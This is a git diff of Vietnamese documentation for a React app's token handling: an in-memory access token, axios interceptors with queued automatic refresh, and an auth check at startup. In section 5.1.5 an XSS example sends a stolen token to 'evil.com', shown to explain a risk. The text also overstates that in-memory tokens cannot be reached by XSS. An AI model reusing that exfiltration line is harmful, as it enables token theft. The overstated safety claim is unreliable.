@@ -549,20 +549,128 @@ public ResponseEntity<?> createUser(...) {
 
 ## 🔄 **PHẦN 5: AUTOMATIC TOKEN REFRESH (FRONTEND)**
 
-### **5.1. Request Interceptor**
+### **5.1. InMemoryAccessToken - Lưu Token Trong Bộ Nhớ**
 
-**Lưu Access Token trong memory:**
+#### **5.1.1. Khái Niệm "In-Memory"**
+
+**InMemoryAccessToken** là một biến JavaScript thông thường được khai báo ở module scope (ngoài component), lưu trữ Access Token trong RAM của trình duyệt.
+
+```javascript
+// api.js - File này được import một lần khi app khởi động
+let inMemoryAccessToken = null;  // ← Biến này tồn tại trong RAM
+
+// Hàm để set token (được gọi từ AuthContext)
+export const setAccessToken = (token) => {
+    inMemoryAccessToken = token;  // Gán giá trị vào biến
+};
+
+// Hàm để get token (dùng cho WebSocket)
+export const getAccessToken = () => {
+    return inMemoryAccessToken;  // Đọc giá trị từ biến
+};
+```
+
+**Đặc điểm:**
+- ✅ **Tồn tại trong RAM:** Chỉ tồn tại khi JavaScript đang chạy
+- ✅ **Module-level variable:** Không phải state của React component
+- ✅ **Chia sẻ toàn cục:** Tất cả các file import `api.js` đều truy cập cùng một biến
+- ✅ **Tự động mất khi refresh:** Khi user refresh trang, JavaScript reload → biến reset về `null`
+
+---
+
+#### **5.1.2. So Sánh: Memory vs localStorage**
+
+| Đặc điểm | In-Memory | localStorage |
+|----------|-----------|--------------|
+| **Vị trí lưu** | RAM (JavaScript variable) | Disk (Browser storage) |
+| **Truy cập** | Chỉ từ JavaScript trong cùng origin | Có thể truy cập từ DevTools, extensions |
+| **XSS Attack** | ❌ Không thể đọc được (biến private) | ⚠️ Có thể bị đọc nếu có XSS |
+| **Khi refresh trang** | ✅ Tự động mất (reset về null) | ❌ Vẫn còn (phải xóa thủ công) |
+| **Lifetime** | Chỉ khi tab đang mở | Vĩnh viễn (cho đến khi xóa) |
+| **Performance** | ✅ Cực nhanh (RAM) | ⚠️ Chậm hơn (I/O disk) |
+
+**Ví dụ minh họa:**
+
+```javascript
+// ❌ CÁCH CŨ (KHÔNG AN TOÀN) - localStorage
+localStorage.setItem('token', 'abc123');
+// Vấn đề:
+// - Có thể bị XSS: <script>alert(localStorage.getItem('token'))</script>
+// - Vẫn còn sau khi refresh → phải check và xóa thủ công
+// - Có thể xem trong DevTools → Application → Local Storage
+
+// ✅ CÁCH MỚI (AN TOÀN) - In-Memory
+let inMemoryAccessToken = 'abc123';
+// Ưu điểm:
+// - XSS không thể đọc được (biến private trong module)
+// - Tự động mất khi refresh → buộc phải refresh token
+// - Không thể xem trong DevTools (không có trong storage)
+```
+
+---
+
+#### **5.1.3. Vòng Đời Của InMemoryAccessToken**
+
+```
+┌─────────────────────────────────────────────────────────┐
+│  1. APP KHỞI ĐỘNG                                       │
+│     - File api.js được import                           │
+│     - inMemoryAccessToken = null (mặc định)             │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  2. USER ĐĂNG NHẬP                                      │
+│     - AuthContext.login() nhận token từ backend         │
+│     - Gọi setAccessToken(token)                         │
+│     - inMemoryAccessToken = "JWT_TOKEN_ABC123"          │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  3. SỬ DỤNG TOKEN                                       │
+│     - Mỗi request → interceptor đọc inMemoryAccessToken │
+│     - Thêm vào header: Authorization: Bearer {token}    │
+│     - Token vẫn còn trong memory                        │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  4. TOKEN HẾT HẠN (401)                                 │
+│     - Interceptor phát hiện 401                         │
+│     - Gọi /refresh → nhận token mới                     │
+│     - setAccessToken(newToken) → CẬP NHẬT token mới     │
+│     - inMemoryAccessToken = "JWT_TOKEN_XYZ789"          │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  5. USER REFRESH TRANG                                  │
+│     - JavaScript reload                                 │
+│     - api.js được import lại                            │
+│     - inMemoryAccessToken = null (RESET)                │
+│     - AuthContext.checkAuthStatus() gọi /refresh        │
+│     - Nhận token mới → setAccessToken()                 │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  6. USER ĐĂNG XUẤT                                      │
+│     - AuthContext.logout()                              │
+│     - setAccessToken(null)                              │
+│     - inMemoryAccessToken = null                        │
+└─────────────────────────────────────────────────────────┘
+```
+
+---
+
+#### **5.1.4. Request Interceptor - Tự Động Gắn Token**
 
 ```javascript
 // api.js
-let inMemoryAccessToken = null;
+const api = axios.create({
+    baseURL: "/api",
+    withCredentials: true,  // Quan trọng: để gửi HttpOnly cookie
+});
 
-export const setAccessToken = (token) => {
-    inMemoryAccessToken = token;
-};
-
-// Request interceptor - Thêm token vào header
+// Request interceptor - Chạy TRƯỚC mỗi request
 api.interceptors.request.use((config) => {
+    // Đọc token từ memory (không phải localStorage)
     if (inMemoryAccessToken) {
         config.headers.Authorization = `Bearer ${inMemoryAccessToken}`;
     }
@@ -570,40 +678,217 @@ api.interceptors.request.use((config) => {
 });
 ```
 
-**Tại sao lưu trong memory?**
-- ✅ An toàn hơn localStorage (không thể truy cập từ script khác)
-- ✅ Tự động xóa khi refresh trang
-- ✅ Không bị XSS attack
+**Luồng hoạt động:**
+1. Component gọi API: `newsAPI.getMyNews()`
+2. Axios interceptor chặn request
+3. Kiểm tra `inMemoryAccessToken` có giá trị không
+4. Nếu có → thêm header `Authorization: Bearer {token}`
+5. Gửi request đến server
+
+**Ví dụ thực tế:**
+```javascript
+// Component gọi API
+const response = await newsAPI.getMyNews();
+
+// Điều gì xảy ra:
+// 1. newsAPI.getMyNews() → api.get("/news/my-news")
+// 2. Interceptor chạy:
+//    - Đọc inMemoryAccessToken = "eyJhbGciOiJIUzI1NiIs..."
+//    - Thêm header: Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
+// 3. Request được gửi với header đầy đủ
+```
 
 ---
 
-### **5.2. Response Interceptor - Auto Refresh**
+#### **5.1.5. Tại Sao Không Dùng localStorage?**
 
-**Logic xử lý 401:**
+**Vấn đề với localStorage:**
+
+1. **XSS Attack:**
+```javascript
+// Hacker inject script vào trang
+<script>
+    // Có thể đọc token từ localStorage
+    const token = localStorage.getItem('token');
+    // Gửi token đến server của hacker
+    fetch('https://evil.com/steal?token=' + token);
+</script>
+```
+
+2. **Vẫn còn sau refresh:**
+```javascript
+// User đăng nhập → token lưu vào localStorage
+localStorage.setItem('token', 'abc123');
+
+// User refresh trang
+// → Token vẫn còn trong localStorage
+// → Phải check token có hợp lệ không
+// → Nếu hết hạn, phải refresh → phức tạp
+```
+
+3. **Có thể xem trong DevTools:**
+- Mở DevTools → Application → Local Storage
+- Token hiển thị rõ ràng → không an toàn
+
+**Giải pháp với In-Memory:**
+
+1. **Chống XSS:**
+```javascript
+// Biến inMemoryAccessToken là private trong module
+// XSS script không thể truy cập được
+// <script>alert(inMemoryAccessToken)</script> → undefined
+```
+
+2. **Tự động reset khi refresh:**
+```javascript
+// User refresh trang
+// → JavaScript reload
+// → inMemoryAccessToken = null (tự động)
+// → AuthContext.checkAuthStatus() gọi /refresh
+// → Nhận token mới → setAccessToken()
+// → Luôn có token mới, không cần check cũ
+```
+
+3. **Không thể xem trong DevTools:**
+- Token chỉ tồn tại trong RAM
+- Không có trong Application → Local Storage
+- An toàn hơn
+
+---
+
+#### **5.1.6. Khi Nào Token Được Set?**
+
+**Các trường hợp set token:**
+
+1. **Khi đăng nhập:**
+```javascript
+// AuthContext.js
+const login = async (credentials) => {
+    const response = await newsAPI.login(credentials);
+    const { token } = response.data;
+    
+    setAccessToken(token);  // ← Set token vào memory
+    setUser(userData);
+};
+```
+
+2. **Khi refresh token (tự động):**
+```javascript
+// api.js - Response interceptor
+const rs = await api.post('/auth/refresh');
+const { accessToken } = rs.data;
+setAccessToken(accessToken);  // ← Cập nhật token mới
+```
+
+3. **Khi app khởi động:**
+```javascript
+// AuthContext.js
+const checkAuthStatus = async () => {
+    const response = await newsAPI.refreshToken();
+    const { accessToken } = response.data;
+    setAccessToken(accessToken);  // ← Set token sau khi refresh
+};
+```
+
+4. **Khi OAuth2 login:**
+```javascript
+// AuthContext.js
+const oauth2Login = async (token, userData) => {
+    setAccessToken(token);  // ← Set token từ OAuth2
+};
+```
+
+5. **Khi đăng xuất:**
+```javascript
+// AuthContext.js
+const logout = async () => {
+    await newsAPI.logout();
+    setAccessToken(null);  // ← Xóa token (set về null)
+};
+```
+
+---
+
+#### **5.1.7. Code Hoàn Chỉnh**
 
 ```javascript
+// api.js
+import axios from "axios";
+
+const api = axios.create({
+    baseURL: "/api",
+    withCredentials: true,  // Gửi HttpOnly cookie
+});
+
+// ============================================
+// IN-MEMORY ACCESS TOKEN
+// ============================================
+
+// Biến lưu token trong RAM (module-level)
+let inMemoryAccessToken = null;
+
+// Hàm để set token (export để AuthContext dùng)
+export const setAccessToken = (token) => {
+    inMemoryAccessToken = token;
+    console.log('Token đã được lưu vào memory:', token ? 'Có' : 'Không');
+};
+
+// Hàm để get token (export để WebSocket dùng)
+export const getAccessToken = () => {
+    return inMemoryAccessToken;
+};
+
+// ============================================
+// REQUEST INTERCEPTOR
+// ============================================
+
+api.interceptors.request.use(
+    (config) => {
+        // Mỗi request, tự động thêm token vào header
+        if (inMemoryAccessToken) {
+            config.headers.Authorization = `Bearer ${inMemoryAccessToken}`;
+        }
+        return config;
+    },
+    (error) => Promise.reject(error)
+);
+
+// ============================================
+// RESPONSE INTERCEPTOR (Auto Refresh)
+// ============================================
+
 let isRefreshing = false;
-let failedQueue = [];  // Hàng đợi các request bị lỗi 401
+let failedQueue = [];
+
+const processQueue = (error, token = null) => {
+    failedQueue.forEach(prom => {
+        if (error) {
+            prom.reject(error);
+        } else {
+            prom.resolve(token);
+        }
+    });
+    failedQueue = [];
+};
 
 api.interceptors.response.use(
-    (response) => response,  // Success
+    (response) => response,
     async (error) => {
         const originalRequest = error.config;
         
         // Chỉ xử lý 401 và chưa retry
         if (error.response?.status === 401 && !originalRequest._retry) {
             
-            // Nếu đang refresh, đưa vào hàng đợi
             if (isRefreshing) {
+                // Đưa vào hàng đợi
                 return new Promise((resolve, reject) => {
                     failedQueue.push({ resolve, reject });
                 }).then(token => {
                     originalRequest.headers.Authorization = 'Bearer ' + token;
-                    return api(originalRequest);  // Retry
+                    return api(originalRequest);
                 });
             }
             
-            // Bắt đầu refresh
             originalRequest._retry = true;
             isRefreshing = true;
             
@@ -612,21 +897,21 @@ api.interceptors.response.use(
                 const rs = await api.post('/auth/refresh');
                 const { accessToken } = rs.data;
                 
-                // Lưu token mới
+                // CẬP NHẬT TOKEN MỚI VÀO MEMORY
                 setAccessToken(accessToken);
                 
-                // Cập nhật token cho request gốc và các request trong queue
+                // Cập nhật header cho request gốc và queue
                 originalRequest.headers.Authorization = 'Bearer ' + accessToken;
-                processQueue(null, accessToken);  // Giải quyết hàng đợi
+                processQueue(null, accessToken);
                 
                 isRefreshing = false;
-                return api(originalRequest);  // Retry request gốc
+                return api(originalRequest);  // Retry
                 
             } catch (_error) {
-                // Refresh thất bại → Logout
+                // Refresh thất bại → Xóa token
                 isRefreshing = false;
                 processQueue(_error, null);
-                setAccessToken(null);
+                setAccessToken(null);  // ← Xóa token khỏi memory
                 window.dispatchEvent(new Event("auth-failed"));
                 return Promise.reject(_error);
             }
@@ -637,51 +922,570 @@ api.interceptors.response.use(
 );
 ```
 
-**Tại sao cần queue?**
-- Nếu nhiều request cùng lúc bị 401
-- Chỉ cần 1 request gọi `/refresh`
-- Các request khác chờ và retry với token mới
+---
 
-**Ví dụ:**
-```
-Request 1 → 401 → Bắt đầu refresh
-Request 2 → 401 → Vào queue
-Request 3 → 401 → Vào queue
+#### **5.1.8. Tóm Tắt: InMemoryAccessToken**
 
-Refresh thành công → Token mới
-Request 1 → Retry với token mới ✅
-Request 2 → Retry với token mới ✅
-Request 3 → Retry với token mới ✅
+**Ưu điểm:**
+- ✅ **An toàn:** Chống XSS, không thể đọc từ script khác
+- ✅ **Tự động reset:** Mất khi refresh trang → buộc phải refresh token
+- ✅ **Nhanh:** Truy cập từ RAM, không cần I/O disk
+- ✅ **Private:** Không thể xem trong DevTools
+
+**Nhược điểm:**
+- ⚠️ **Mất khi refresh:** Phải gọi `/refresh` mỗi lần app khởi động
+- ⚠️ **Không persist:** Không lưu vĩnh viễn (nhưng đây là tính năng, không phải bug)
+
+**Kết luận:**
+- InMemoryAccessToken phù hợp với kiến trúc 2-token (Access Token ngắn hạn + Refresh Token dài hạn)
+- Refresh Token (HttpOnly cookie) đảm bảo user không cần đăng nhập lại
+- Access Token (In-Memory) đảm bảo an toàn và tự động refresh
+
+---
+
+### **5.2. Response Interceptor - Auto Refresh Token**
+
+#### **5.2.1. Tại Sao Cần Auto Refresh?**
+
+**Vấn đề:**
+- Access Token có thời hạn ngắn (1 ngày)
+- Khi token hết hạn, tất cả request sẽ bị 401 Unauthorized
+- User không muốn phải đăng nhập lại mỗi khi token hết hạn
+
+**Giải pháp:**
+- Tự động phát hiện 401
+- Tự động gọi `/refresh` để lấy token mới
+- Tự động retry request gốc với token mới
+- User không cảm nhận được việc refresh (seamless)
+
+---
+
+#### **5.2.2. Logic Xử Lý 401 Chi Tiết**
+
+```javascript
+// api.js
+let isRefreshing = false;  // Flag: đang refresh hay chưa?
+let failedQueue = [];      // Hàng đợi các request bị 401
+
+// Hàm xử lý hàng đợi
+const processQueue = (error, token = null) => {
+    failedQueue.forEach(prom => {
+        if (error) {
+            prom.reject(error);  // Refresh thất bại → reject tất cả
+        } else {
+            prom.resolve(token); // Refresh thành công → resolve với token mới
+        }
+    });
+    failedQueue = [];  // Xóa hàng đợi
+};
+
+// Response interceptor
+api.interceptors.response.use(
+    (response) => response,  // Nếu thành công, trả về bình thường
+    async (error) => {
+        const originalRequest = error.config;
+        
+        // CHỈ xử lý khi:
+        // 1. Lỗi là 401 (Unauthorized)
+        // 2. Request này chưa từng retry (tránh loop vô hạn)
+        if (error.response?.status === 401 && !originalRequest._retry) {
+            
+            // ============================================
+            // TRƯỜNG HỢP 1: Đang có request khác refresh
+            // ============================================
+            if (isRefreshing) {
+                // Đưa request này vào hàng đợi
+                return new Promise((resolve, reject) => {
+                    failedQueue.push({ resolve, reject });
+                }).then(token => {
+                    // Khi refresh xong, retry với token mới
+                    originalRequest.headers.Authorization = 'Bearer ' + token;
+                    return api(originalRequest);
+                });
+            }
+            
+            // ============================================
+            // TRƯỜNG HỢP 2: Chưa có request nào refresh
+            // ============================================
+            originalRequest._retry = true;  // Đánh dấu đã retry
+            isRefreshing = true;            // Bắt đầu refresh
+            
+            try {
+                // 1. Gọi API /refresh (cookie tự động gửi kèm)
+                const rs = await api.post('/auth/refresh');
+                const { accessToken } = rs.data;
+                
+                // 2. CẬP NHẬT TOKEN MỚI VÀO MEMORY
+                setAccessToken(accessToken);
+                
+                // 3. Cập nhật header cho request gốc
+                originalRequest.headers.Authorization = 'Bearer ' + accessToken;
+                
+                // 4. Giải quyết hàng đợi (nếu có request khác đang chờ)
+                processQueue(null, accessToken);
+                
+                // 5. Reset flag
+                isRefreshing = false;
+                
+                // 6. Retry request gốc với token mới
+                return api(originalRequest);
+                
+            } catch (_error) {
+                // ============================================
+                // TRƯỜNG HỢP 3: Refresh thất bại
+                // ============================================
+                // (Refresh Token hết hạn hoặc bị revoked)
+                
+                isRefreshing = false;
+                
+                // Báo lỗi cho tất cả request trong hàng đợi
+                processQueue(_error, null);
+                
+                // XÓA TOKEN KHỎI MEMORY
+                setAccessToken(null);
+                
+                // Gửi event để AuthContext logout
+                window.dispatchEvent(new Event("auth-failed"));
+                
+                return Promise.reject(_error);
+            }
+        }
+        
+        // Nếu không phải 401 hoặc đã retry rồi → trả về lỗi bình thường
+        return Promise.reject(error);
+    }
+);
 ```
+
+---
+
+#### **5.2.3. Tại Sao Cần Queue (Hàng Đợi)?**
+
+**Vấn đề:**
+- Nhiều request có thể cùng lúc bị 401
+- Nếu mỗi request đều gọi `/refresh` → nhiều request refresh không cần thiết
+- Có thể gây race condition
+
+**Giải pháp Queue:**
+- Chỉ 1 request đầu tiên gọi `/refresh`
+- Các request khác chờ trong queue
+- Khi refresh xong, tất cả request trong queue retry với token mới
+
+**Ví dụ minh họa:**
+
+```
+Thời điểm T0:
+  - User click 3 button cùng lúc
+  - Request 1: GET /api/news/my-news
+  - Request 2: GET /api/notifications
+  - Request 3: GET /api/profile
+
+Thời điểm T1 (tất cả đều bị 401):
+  - Request 1 → 401 → Bắt đầu refresh (isRefreshing = true)
+  - Request 2 → 401 → Vào queue (chờ)
+  - Request 3 → 401 → Vào queue (chờ)
+
+Thời điểm T2 (refresh thành công):
+  - Request 1: Retry với token mới ✅
+  - Request 2: Lấy token từ queue → Retry ✅
+  - Request 3: Lấy token từ queue → Retry ✅
+  - isRefreshing = false
+  - failedQueue = []
+```
+
+**Code minh họa queue:**
+
+```javascript
+// Request 1 (đầu tiên)
+if (!isRefreshing) {
+    isRefreshing = true;
+    const newToken = await refresh();
+    setAccessToken(newToken);
+    processQueue(null, newToken);  // Giải quyết queue
+}
+
+// Request 2, 3 (sau đó)
+if (isRefreshing) {
+    // Đưa vào queue
+    return new Promise((resolve, reject) => {
+        failedQueue.push({ resolve, reject });
+    }).then(token => {
+        // Khi Request 1 refresh xong, processQueue() sẽ resolve
+        // → Request 2, 3 nhận được token mới
+        return retryWithNewToken(token);
+    });
+}
+```
+
+---
+
+#### **5.2.4. Luồng Hoạt Động Chi Tiết**
+
+```
+┌─────────────────────────────────────────────────────────┐
+│  REQUEST BỊ 401                                         │
+│  GET /api/news/my-news → 401 Unauthorized              │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  INTERCEPTOR PHÁT HIỆN                                  │
+│  - error.response.status === 401?                      │
+│  - originalRequest._retry === false?                   │
+│  → CÓ, bắt đầu xử lý                                    │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  KIỂM TRA: Đang refresh?                                │
+│  - isRefreshing === true?                              │
+│    → CÓ: Đưa vào queue, chờ                            │
+│    → KHÔNG: Tiếp tục                                    │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  BẮT ĐẦU REFRESH                                        │
+│  - originalRequest._retry = true                       │
+│  - isRefreshing = true                                 │
+│  - Gọi POST /api/auth/refresh                          │
+│    (Cookie HttpOnly tự động gửi kèm)                   │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  REFRESH THÀNH CÔNG                                     │
+│  - Nhận accessToken mới từ response                    │
+│  - setAccessToken(newToken) → CẬP NHẬT MEMORY          │
+│  - processQueue(null, newToken) → Giải quyết queue     │
+│  - isRefreshing = false                                │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  RETRY REQUEST GỐC                                      │
+│  - originalRequest.headers.Authorization =              │
+│    'Bearer ' + newToken                                │
+│  - return api(originalRequest)                         │
+│  → Request được gửi lại với token mới                  │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  THÀNH CÔNG                                             │
+│  - Response 200 OK                                     │
+│  - Component nhận được data                            │
+│  - User không biết đã refresh token                    │
+└─────────────────────────────────────────────────────────┘
+```
+
+---
+
+#### **5.2.5. Xử Lý Refresh Thất Bại**
+
+**Khi nào refresh thất bại?**
+- Refresh Token hết hạn (quá 7-30 ngày)
+- Refresh Token bị revoked (user logout, admin revoke)
+- Refresh Token không hợp lệ
+
+**Hành động khi thất bại:**
+
+```javascript
+catch (_error) {
+    // 1. Reset flag
+    isRefreshing = false;
+    
+    // 2. Báo lỗi cho tất cả request trong queue
+    processQueue(_error, null);
+    
+    // 3. XÓA TOKEN KHỎI MEMORY
+    setAccessToken(null);
+    
+    // 4. Gửi event để AuthContext logout
+    window.dispatchEvent(new Event("auth-failed"));
+    
+    // 5. Reject error
+    return Promise.reject(_error);
+}
+```
+
+**AuthContext lắng nghe event:**
+
+```javascript
+// AuthContext.js
+useEffect(() => {
+    const handleAuthFailure = () => {
+        setUser(null);
+        setIsAuthenticated(false);
+        setLoading(false);
+        window.location.href = '/login';  // Redirect về login
+    };
+    
+    window.addEventListener("auth-failed", handleAuthFailure);
+    
+    return () => {
+        window.removeEventListener("auth-failed", handleAuthFailure);
+    };
+}, []);
+```
+
+---
+
+#### **5.2.6. Tóm Tắt: Auto Refresh**
+
+**Ưu điểm:**
+- ✅ **Seamless:** User không cảm nhận được việc refresh
+- ✅ **Tự động:** Không cần code thủ công ở mỗi component
+- ✅ **Hiệu quả:** Chỉ 1 request refresh cho nhiều request bị 401
+- ✅ **An toàn:** Xử lý đúng khi refresh thất bại
+
+**Lưu ý:**
+- ⚠️ Refresh Token phải còn hợp lệ (chưa hết hạn)
+- ⚠️ Cookie HttpOnly phải được gửi kèm (`withCredentials: true`)
+- ⚠️ Queue tránh nhiều request refresh cùng lúc
 
 ---
 
 ### **5.3. Check Auth Status khi App Start**
 
+#### **5.3.1. Tại Sao Cần Check Auth Status?**
+
+**Vấn đề:**
+- Khi user refresh trang, `inMemoryAccessToken` bị reset về `null`
+- App không biết user đã đăng nhập hay chưa
+- Cần kiểm tra xem Refresh Token còn hợp lệ không
+
+**Giải pháp:**
+- Khi app khởi động, gọi `/refresh` để lấy Access Token mới
+- Nếu thành công → User đã đăng nhập → Lưu token vào memory
+- Nếu thất bại → User chưa đăng nhập → Không làm gì
+
+---
+
+#### **5.3.2. Code Chi Tiết**
+
 ```javascript
 // AuthContext.js
-useEffect(() => {
-    checkAuthStatus();
-}, []);
-
-const checkAuthStatus = async () => {
-    try {
-        // Thử refresh token
-        const response = await newsAPI.refreshToken();
-        const { accessToken } = response.data;
+export const AuthProvider = ({ children }) => {
+    const [user, setUser] = useState(null);
+    const [loading, setLoading] = useState(true);
+    const [isAuthenticated, setIsAuthenticated] = useState(false);
+    
+    // Chạy khi component mount (app khởi động)
+    useEffect(() => {
+        checkAuthStatus();
         
-        // Lưu token
-        setAccessToken(accessToken);
+        // Lắng nghe event "auth-failed" từ interceptor
+        const handleAuthFailure = () => {
+            setUser(null);
+            setIsAuthenticated(false);
+            setLoading(false);
+            window.location.href = '/login';
+        };
         
-        // Lấy thông tin user
-        await refreshUser();
-    } catch (error) {
-        // Refresh thất bại → Chưa đăng nhập
-        setUser(null);
-        setIsAuthenticated(false);
-    }
+        window.addEventListener("auth-failed", handleAuthFailure);
+        
+        return () => {
+            window.removeEventListener("auth-failed", handleAuthFailure);
+        };
+    }, []);
+    
+    const checkAuthStatus = async () => {
+        try {
+            setLoading(true);
+            
+            // 1. Gọi /refresh để lấy Access Token mới
+            // (Cookie HttpOnly tự động gửi kèm)
+            const response = await newsAPI.refreshToken();
+            const { accessToken } = response.data;
+            
+            // 2. LƯU TOKEN VÀO MEMORY
+            setAccessToken(accessToken);
+            
+            // 3. Lấy thông tin user hiện tại
+            await refreshUser();
+            
+        } catch (error) {
+            // Refresh thất bại → User chưa đăng nhập
+            // (Không có Refresh Token hoặc đã hết hạn)
+            setUser(null);
+            setIsAuthenticated(false);
+        } finally {
+            setLoading(false);
+        }
+    };
+    
+    const refreshUser = async () => {
+        try {
+            // Gọi API để lấy thông tin user
+            const response = await newsAPI.getCurrentUser();
+            const userData = response.data;
+            
+            // Kiểm tra user có bị khóa không
+            if (userData.status !== 'ACTIVE') {
+                await logout();
+                return false;
+            }
+            
+            // Set user state
+            setUser(userData);
+            setIsAuthenticated(true);
+            return true;
+            
+        } catch (e) {
+            setUser(null);
+            setIsAuthenticated(false);
+            return false;
+        }
+    };
 };
 ```
+
+---
+
+#### **5.3.3. Luồng Hoạt Động**
+
+```
+┌─────────────────────────────────────────────────────────┐
+│  1. APP KHỞI ĐỘNG                                       │
+│     - User mở trang web                                 │
+│     - React app render                                  │
+│     - AuthProvider mount                                │
+│     - useEffect() chạy → checkAuthStatus()             │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  2. INMEMORY TOKEN = NULL                               │
+│     - Khi refresh trang, JavaScript reload              │
+│     - api.js được import lại                            │
+│     - inMemoryAccessToken = null (reset)                │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  3. GỌI /REFRESH                                        │
+│     - newsAPI.refreshToken()                            │
+│     - Cookie HttpOnly tự động gửi kèm                   │
+│     - Backend kiểm tra Refresh Token                    │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  4A. REFRESH THÀNH CÔNG                                 │
+│     - Backend trả về Access Token mới                   │
+│     - setAccessToken(token) → LƯU VÀO MEMORY           │
+│     - refreshUser() → Lấy thông tin user                │
+│     - setUser(userData)                                 │
+│     - setIsAuthenticated(true)                          │
+│     - setLoading(false)                                 │
+│     → User đã đăng nhập, app sẵn sàng                  │
+└─────────────────────────────────────────────────────────┘
+                    ↓
+┌─────────────────────────────────────────────────────────┐
+│  4B. REFRESH THẤT BẠI                                   │
+│     - Refresh Token không tồn tại/hết hạn               │
+│     - Backend trả về 401                                │
+│     - catch error                                       │
+│     - setUser(null)                                     │
+│     - setIsAuthenticated(false)                         │
+│     - setLoading(false)                                 │
+│     → User chưa đăng nhập, hiển thị login page         │
+└─────────────────────────────────────────────────────────┘
+```
+
+---
+
+#### **5.3.4. Tại Sao Không Dùng localStorage để Check?**
+
+**Cách cũ (không an toàn):**
+```javascript
+// ❌ KHÔNG NÊN
+useEffect(() => {
+    const token = localStorage.getItem('token');
+    if (token) {
+        // Token có thể đã hết hạn!
+        // Phải check token có hợp lệ không → phức tạp
+        setAccessToken(token);
+    }
+}, []);
+```
+
+**Vấn đề:**
+- Token trong localStorage có thể đã hết hạn
+- Phải validate token → phức tạp
+- Không an toàn (XSS có thể đọc)
+
+**Cách mới (an toàn):**
+```javascript
+// ✅ NÊN DÙNG
+useEffect(() => {
+    // Luôn gọi /refresh để lấy token MỚI
+    // Nếu Refresh Token còn hợp lệ → có token mới
+    // Nếu Refresh Token hết hạn → không có token
+    checkAuthStatus();
+}, []);
+```
+
+**Ưu điểm:**
+- Luôn có token mới (chưa hết hạn)
+- Đơn giản: chỉ cần gọi `/refresh`
+- An toàn: không lưu token trong localStorage
+
+---
+
+#### **5.3.5. Loading State**
+
+**Tại sao cần loading state?**
+
+```javascript
+const [loading, setLoading] = useState(true);
+
+// Khi app khởi động
+useEffect(() => {
+    checkAuthStatus();  // Mất thời gian (gọi API)
+}, []);
+
+// Trong khi checkAuthStatus đang chạy:
+// - loading = true
+// - Không biết user đã đăng nhập hay chưa
+// - Không nên render ProtectedRoute
+
+// Sau khi checkAuthStatus xong:
+// - loading = false
+// - Biết rõ user đã đăng nhập hay chưa
+// - Có thể render đúng route
+```
+
+**Sử dụng trong ProtectedRoute:**
+
+```javascript
+// ProtectedRoute.js
+const ProtectedRoute = ({ children }) => {
+    const { isAuthenticated, loading } = useAuth();
+    
+    if (loading) {
+        return <div>Loading...</div>;  // Chờ checkAuthStatus
+    }
+    
+    if (!isAuthenticated) {
+        return <Navigate to="/login" />;
+    }
+    
+    return children;
+};
+```
+
+---
+
+#### **5.3.6. Tóm Tắt: Check Auth Status**
+
+**Mục đích:**
+- Kiểm tra user đã đăng nhập hay chưa khi app khởi động
+- Lấy Access Token mới từ Refresh Token
+- Lưu token vào memory để dùng cho các request sau
+
+**Luồng:**
+1. App khởi động → `checkAuthStatus()`
+2. Gọi `/refresh` (cookie tự động gửi kèm)
+3. Nếu thành công → Lưu token vào memory → Lấy user info
+4. Nếu thất bại → User chưa đăng nhập
+
+**Lưu ý:**
+- ⚠️ Phải có `loading` state để tránh render sai route
+- ⚠️ Refresh Token phải còn hợp lệ (chưa hết hạn)
+- ⚠️ Cookie HttpOnly phải được gửi kèm (`withCredentials: true`)
 
 ---
 
